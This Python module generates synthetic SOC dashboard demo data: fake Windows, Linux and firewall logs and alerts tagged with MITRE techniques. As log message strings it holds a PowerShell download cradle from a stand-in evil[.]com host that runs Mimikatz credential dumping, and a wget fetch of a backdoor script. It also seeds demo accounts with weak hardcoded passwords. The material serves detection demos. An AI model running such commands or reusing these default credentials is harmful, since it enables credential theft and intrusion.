"""
Seed Data - Generates realistic SOC demo data with attack scenarios
"""
import uuid
import random
import json
from datetime import datetime, timedelta, timezone

def generate_seed_data():
    now = datetime.now(timezone.utc)
    logs = []
    alerts = []
    
    attacker_ips = ['185.220.101.45', '45.33.32.156', '103.224.182.250', '194.26.29.120', '91.240.118.172']
    users = ['jdoe', 'asmith', 'mwilson', 'tjones', 'kbrown', 'admin', 'svc_backup']
    countries = [('Russia','Moscow',55.75,37.61), ('China','Beijing',39.9,116.4), ('North Korea','Pyongyang',39.03,125.75),
                 ('Iran','Tehran',35.69,51.38), ('Brazil','Sao Paulo',-23.55,-46.63)]
    
    # === Brute Force Attack (25 attempts) ===
    for i in range(25):
        t = (now - timedelta(hours=2, minutes=-i)).isoformat()
        logs.append(_log(t, 'DC-01', 'windows', 'Security', '4625', 'high' if i > 15 else 'medium',
            f"Account failed to log on. Account: {random.choice(users[:4])} | Source IP: {attacker_ips[0]} | Failure: Bad password | Logon Type: 3",
            attacker_ips[0], '10.0.1.10', random.choice(users[:4]), 'DC-01', countries[0]))
    
    # Successful login after brute force
    t = (now - timedelta(hours=1, minutes=34)).isoformat()
    logs.append(_log(t, 'DC-01', 'windows', 'Security', '4624', 'critical',
        f"Account successfully logged on. Account: jdoe | Source IP: {attacker_ips[0]} | Logon Type: 3",
        attacker_ips[0], '10.0.1.10', 'jdoe', 'DC-01', countries[0]))
    
    alerts.append(_alert('Brute Force Attack from 185.220.101.45',
        'Multiple failed login attempts (25) from Russia targeting DC-01 followed by successful compromise of jdoe account',
        'critical', 'BRUTE_FORCE_LOGIN', 'DC-01', attacker_ips[0], 'jdoe',
        ['T1110 - Brute Force'], 'Delivery', 88))
    
    # === Lateral Movement ===
    for i, host in enumerate(['FILE-SVR-01', 'WEB-SVR-01', 'WS-001']):
        t = (now - timedelta(hours=1, minutes=30-i*5)).isoformat()
        logs.append(_log(t, host, 'windows', 'Security', '4624', 'high',
            f"Account logged on. Account: jdoe | Source IP: 10.0.1.10 | Logon Type: 3 (Network)",
            '10.0.1.10', '', 'jdoe', host))
    
    alerts.append(_alert('Lateral Movement - User jdoe',
        'User jdoe authenticated to FILE-SVR-01, WEB-SVR-01, WS-001 in quick succession after DC-01 compromise',
        'critical', 'LATERAL_MOVEMENT', 'Multiple', '10.0.1.10', 'jdoe',
        ['T1021 - Remote Services', 'T1078 - Valid Accounts'], 'Lateral Movement', 92))
    
    # === Suspicious PowerShell ===
    t = (now - timedelta(hours=1, minutes=15)).isoformat()
    logs.append(_log(t, 'WS-003', 'windows', 'PowerShell', '4104', 'critical',
        'PowerShell Script Block: IEX(New-Object Net.WebClient).DownloadString("http://evil[.]com/payload.ps1") | Invoke-Mimikatz -DumpCreds',
        '', '', 'jdoe', 'WS-003'))
    
    alerts.append(_alert('Suspicious PowerShell - Mimikatz Execution',
        'Encoded PowerShell with download cradle and Mimikatz credential dumping on WS-003',
        'critical', 'SUSPICIOUS_POWERSHELL', 'WS-003', '', 'jdoe',
        ['T1059.001 - PowerShell', 'T1003.001 - LSASS Memory'], 'Credential Access', 97))
    
    # === Privilege Escalation ===
    t = (now - timedelta(hours=1, minutes=10)).isoformat()
    logs.append(_log(t, 'DC-01', 'windows', 'Security', '4728', 'critical',
        'Member added to security group. Member: jdoe | Group: Domain Admins', '', '', 'jdoe', 'DC-01'))
    
    alerts.append(_alert('Privilege Escalation - jdoe → Domain Admins',
        'User jdoe added to Domain Admins group on DC-01 after brute force compromise',
        'critical', 'PRIVILEGE_ESCALATION', 'DC-01', '', 'jdoe',
        ['T1078.002 - Domain Accounts', 'T1098 - Account Manipulation'], 'Privilege Escalation', 98))
    
    # === Data Exfiltration ===
    t = (now - timedelta(hours=1)).isoformat()
    logs.append(_log(t, 'FILE-SVR-01', 'windows', 'network', '', 'critical',
        f'Large outbound data transfer: 450MB sent to {attacker_ips[3]}:443 over 5 minutes. External upload detected.',
        '10.0.1.11', attacker_ips[3], '', 'FILE-SVR-01'))
    
    alerts.append(_alert('Data Exfiltration - 450MB to External IP',
        f'450MB outbound transfer from FILE-SVR-01 to {attacker_ips[3]} over port 443',
        'critical', 'DATA_EXFILTRATION', 'FILE-SVR-01', attacker_ips[3], '',
        ['T1048 - Exfiltration Over Alternative Protocol'], 'Exfiltration', 95))
    
    # === Service Installation ===
    t = (now - timedelta(minutes=55)).isoformat()
    logs.append(_log(t, 'FILE-SVR-01', 'windows', 'System', '7045', 'high',
        'Service installed. Name: WinUpdate64 | Path: C:\\Windows\\Temp\\svc.exe | Account: LocalSystem',
        '', '', 'jdoe', 'FILE-SVR-01'))
    
    alerts.append(_alert('Suspicious Service Installation',
        'New service WinUpdate64 installed from C:\\Windows\\Temp\\svc.exe on FILE-SVR-01',
        'high', 'SERVICE_INSTALLATION', 'FILE-SVR-01', '', 'jdoe',
        ['T1543.003 - Windows Service'], 'Persistence', 82))
    
    # === Linux Events ===
    linux_events = [
        ('sshd', f'Failed password for root from {attacker_ips[1]} port 22 ssh2', 'high'),
        ('sshd', f'Failed password for admin from {attacker_ips[2]} port 22 ssh2', 'high'),
        ('sudo', 'asmith : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'medium'),
        ('auditd', 'type=EXECVE exe="/usr/bin/wget" a0="http://suspicious.com/backdoor.sh"', 'critical'),
        ('cron', '(root) CMD (/tmp/.hidden/miner --algo=sha256)', 'critical'),
        ('sshd', f'Connection closed by {attacker_ips[3]} port 44231 [preauth]', 'medium'),
    ]
    for process, msg, sev in linux_events:
        t = (now - timedelta(minutes=random.randint(5, 120))).isoformat()
        host = random.choice(['ubuntu-web-01', 'centos-db-01', 'ubuntu-app-01'])
        ip = next((ip for ip in attacker_ips if ip in msg), '')
        logs.append(_log(t, host, 'linux', process, '', sev, msg, ip, '', '', host, random.choice(countries)))
    
    alerts.append(_alert(f'SSH Brute Force from {attacker_ips[1]}',
        f'Multiple failed SSH attempts from {attacker_ips[1]} targeting Linux servers',
        'high', 'BRUTE_FORCE_LOGIN', 'ubuntu-web-01', attacker_ips[1], '',
        ['T1110 - Brute Force'], 'Initial Access', 78))
    alerts.append(_alert('Cryptocurrency Miner Detected',
        'Suspicious cron job executing mining software on centos-db-01',
        'high', 'MALWARE_DETECTED', 'centos-db-01', '', '',
        ['T1496 - Resource Hijacking'], 'Impact', 75))
    
    # === Firewall Logs ===
    for _ in range(30):
        t = (now - timedelta(minutes=random.randint(1, 180))).isoformat()
        src = random.choice(attacker_ips)
        dport = random.choice([22, 80, 443, 445, 3389, 8080, 25, 53])
        action = random.choice(['deny', 'deny', 'deny', 'allow'])
        logs.append({
            'id': str(uuid.uuid4()), 'timestamp': t, 'source': 'PA-3260-FW', 'source_type': 'firewall',
            'event_type': 'network', 'severity': 'medium' if action == 'deny' else 'info',
            'message': f"Firewall {action}: src={src} dst=10.0.1.{random.randint(10,50)} dport={dport} action={action}",
            'source_ip': src, 'destination_ip': f'10.0.1.{random.randint(10,50)}', 'destination_port': dport,
            'tags': json.dumps(['firewall', action]),
        })
    
    # === Background Noise ===
    normal = [
        ('DC-01', 'windows', 'Security', '4624', 'info', 'Account logged on. Account: svc_backup | Logon Type: 5'),
        ('WEB-SVR-01', 'windows', 'System', '7036', 'info', 'World Wide Web Publishing Service entered running state.'),
        ('ubuntu-web-01', 'linux', 'nginx', '', 'info', '10.0.3.50 - GET /api/health HTTP/1.1 200'),
        ('centos-db-01', 'linux', 'mysqld', '', 'info', 'InnoDB: Buffer pool(s) load completed'),
        ('DC-01', 'windows', 'Security', '4769', 'info', 'Kerberos service ticket requested. Account: asmith'),
        ('WS-002', 'windows', 'Security', '4688', 'info', 'New process: C:\\Program Files\\Chrome\\chrome.exe | User: asmith'),
    ]
    for src, st, et, eid, sev, msg in normal * 4:
        t = (now - timedelta(minutes=random.randint(1, 300))).isoformat()
        logs.append(_log(t, src, st, et, eid, sev, msg, '', '', random.choice(users), src))
    
    # === Extra Alerts ===
    alerts.extend([
        _alert('DNS Query Spike from WS-005', 'Unusual DNS volume to suspicious domain', 'high',
               'DNS_TUNNELING', 'WS-005', '', '', ['T1071.004 - DNS'], 'C2', 72),
        _alert('Off-Hours Login - tjones', 'Login at 3:42 AM, outside normal hours', 'medium',
               'UNUSUAL_LOGIN_TIME', 'WS-004', '', 'tjones', ['T1078 - Valid Accounts'], 'Initial Access', 45),
        _alert('Firewall Blocks from China', f'Firewall blocked {random.randint(50,200)} attempts from Chinese IPs', 'medium',
               'FIREWALL_ANOMALY', 'PA-3260-FW', attacker_ips[1], '', ['T1595 - Active Scanning'], 'Recon', 55),
    ])
    
    return logs, alerts

def _log(ts, source, source_type, event_type, event_id, severity, message,
         src_ip='', dst_ip='', username='', hostname='', geo=None):
    return {
        'id': str(uuid.uuid4()), 'timestamp': ts, 'source': source, 'source_type': source_type,
        'event_type': event_type, 'event_id': event_id, 'severity': severity, 'message': message,
        'source_ip': src_ip, 'destination_ip': dst_ip, 'username': username, 'hostname': hostname or source,
        'geo_country': geo[0] if geo else '', 'geo_city': geo[1] if geo else '',
        'geo_lat': geo[2] if geo else None, 'geo_lon': geo[3] if geo else None,
        'tags': json.dumps([source_type]),
    }

def _alert(title, desc, severity, rule, source, src_ip, username, mitre, phase, score):
    return {
        'id': str(uuid.uuid4()), 'title': title, 'description': desc, 'severity': severity,
        'status': 'new', 'rule_name': rule, 'source': source, 'source_ip': src_ip,
        'username': username, 'mitre_techniques': json.dumps(mitre), 'kill_chain_phase': phase,
        'threat_score': score,
        'ai_analysis': json.dumps({
            'threat_score': score, 'summary': desc,
            'attack_type': rule.replace('_', ' ').title(),
            'recommended_actions': [
                'Investigate affected systems immediately',
                'Check for related alerts and correlate events',
                'Review user activity and access patterns',
                'Consider isolating affected hosts',
            ],
            'confidence': 85, 'false_positive_likelihood': 'low' if score > 70 else 'medium',
        }),
    }

def seed_database(db_conn):
    """
    Create demo user accounts with hashed passwords on first run.
    Demo data seeding is disabled — only real ingested data is stored.
    """
    from config import settings
    if not settings.DEMO_MODE:
        return

    # Only seed users if the table exists and is empty
    try:
        count = db_conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    except Exception:
        return  # table doesn't exist yet

    if count == 0:
        try:
            from auth import hash_password
        except ImportError:
            try:
                from werkzeug.security import generate_password_hash as hash_password
            except ImportError:
                print("⚠️  Cannot hash passwords — skipping demo user creation")
                return

        import uuid as _uuid
        demo_users = [
            ("admin@soc.local",   "admin123",   "Admin User",     "admin"),
            ("analyst@soc.local", "analyst123", "Senior Analyst", "senior_analyst"),
            ("junior@soc.local",  "junior123",  "Junior Analyst", "analyst"),
        ]
        for email, password, name, role in demo_users:
            uid = str(_uuid.uuid4())
            db_conn.execute(
                "INSERT OR IGNORE INTO users (id, email, name, password_hash, role, is_active) "
                "VALUES (?,?,?,?,?,1)",
                (uid, email, name, hash_password(password), role),
            )
        db_conn.commit()
        print("✅ Demo users created (admin@soc.local / admin123, analyst@soc.local / analyst123, junior@soc.local / junior123)")
        print("⚠️  Change these passwords before exposing the dashboard to a network.")

    print("ℹ️  Demo data seeding skipped — dashboard shows real data only")
